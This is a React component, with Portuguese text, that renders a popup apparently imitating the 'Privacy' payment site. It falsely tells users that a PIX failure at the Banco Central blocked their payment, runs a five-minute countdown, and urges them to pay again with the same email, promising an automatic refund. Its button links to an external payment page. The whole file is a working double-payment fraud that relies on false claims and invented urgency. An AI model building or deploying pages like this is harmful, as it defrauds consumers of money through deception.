"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Clock } from "lucide-react"

export default function PrivacyPopup() {
  const [timeLeft, setTimeLeft] = useState(5 * 60) // 5 minutos em segundos
  const [isVisible, setIsVisible] = useState(true)

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [timeLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleLiberarAcesso = () => {
    window.open("https://pagarprivacy.site/tainacosta/", "_blank")
  }

  if (!isVisible) return null

  return (
    <div className="min-h-screen bg-black/50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-2xl max-w-md w-full overflow-hidden">
        {/* Banner do Privacy */}
        <div className="w-full">
          <img src="/privacy-banner.jpg" alt="Privacy - Compra 100% Segura" className="w-full h-auto object-cover" />
        </div>

        {/* Conteúdo do Pop-up */}
        <div className="p-6 text-center space-y-6">
          {/* Cronômetro */}
          <div className="bg-orange-50 border-2 border-orange-200 rounded-lg p-4">
            <div className="flex items-center justify-center gap-2 mb-2">
              <Clock className="w-5 h-5 text-orange-600" />
              <span className="text-sm font-medium text-orange-800">Tempo restante para pagamento</span>
            </div>
            <div className="text-3xl font-bold text-orange-600">{formatTime(timeLeft)}</div>
          </div>

          {/* Copy principal */}
          <div className="space-y-4">
            <h2 className="text-xl font-bold text-red-600">⚠️ Problema no Pagamento Detectado</h2>

            <div className="bg-red-50 border-l-4 border-red-400 p-4 text-left">
              <p className="text-red-800 font-medium mb-2">
                Identificamos um erro de instabilidade no sistema PIX por parte do Banco Central.
              </p>
              <p className="text-red-700 text-sm">
                Devido a esta instabilidade, sua transação não foi processada corretamente.
              </p>
            </div>

            <div className="bg-orange-50 border-2 border-orange-300 p-4 rounded-lg">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-2xl">📧</span>
                <h3 className="font-bold text-orange-800">MUITO IMPORTANTE!</h3>
              </div>
              <p className="text-orange-800 font-semibold text-sm leading-relaxed">
                <strong>Use EXATAMENTE o mesmo email da compra anterior!</strong>
              </p>
              <p className="text-orange-700 text-sm mt-2">
                É assim que nosso sistema identifica sua compra para liberar o acesso e processar o reembolso
                automaticamente.
                <strong className="text-orange-800"> NÃO ERRE O EMAIL!</strong>
              </p>
            </div>

            <p className="text-gray-700 leading-relaxed font-medium">
              <strong>É necessário realizar a compra novamente</strong> para que:
            </p>

            <ul className="text-left text-gray-600 space-y-2 bg-gray-50 p-4 rounded-lg">
              <li className="flex items-start gap-2">
                <span className="text-green-500 font-bold">✓</span>
                Seu acesso seja liberado imediatamente
              </li>
              <li className="flex items-start gap-2">
                <span className="text-green-500 font-bold">✓</span>O valor retido seja reembolsado automaticamente
              </li>
            </ul>

            <p className="text-orange-600 font-bold text-sm bg-orange-50 p-3 rounded-lg border border-orange-200">
              ⏰ Você tem apenas 5 minutos para completar este processo!
            </p>
          </div>

          {/* Botão de ação */}
          <Button
            onClick={handleLiberarAcesso}
            className="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200"
            size="lg"
          >
            Liberar Meu Acesso
          </Button>

          {/* Aviso de segurança */}
          <div className="text-xs text-gray-500 border-t pt-4">
            <p>🔒 Transação 100% segura e protegida</p>
          </div>
        </div>
      </div>
    </div>
  )
}
